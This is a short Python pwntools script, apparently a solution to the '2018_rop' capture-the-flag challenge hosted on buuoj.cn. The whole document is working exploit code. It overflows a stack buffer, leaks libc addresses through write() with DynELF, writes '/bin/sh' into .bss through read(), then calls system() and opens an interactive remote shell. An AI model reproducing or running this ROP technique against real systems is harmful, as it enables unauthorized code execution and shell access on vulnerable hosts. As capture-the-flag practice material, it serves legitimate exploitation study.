from pwn import *
r=remote('node3.buuoj.cn',28160)

e=ELF('./2018_rop')
write_plt=e.plt['write']
read_plt=e.plt['read']
main_addr=e.symbols['main']
bss_addr=e.symbols['__bss_start']
def leak(address):
        payload1='a'*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(address)+p32(0x4)
        r.sendline(payload1)
        leak_address=r.recv(4)
        return leak_address

d=DynELF(leak,elf=ELF('./2018_rop'))
sys_addr=d.lookup('system','libc')

payload2='a'*(0x88+0x4)+p32(read_plt)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)
r.sendline(payload2)
r.sendline('/bin/sh')

payload3='a'*(0x88+0x4)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)
r.sendline(payload3)

r.interactive()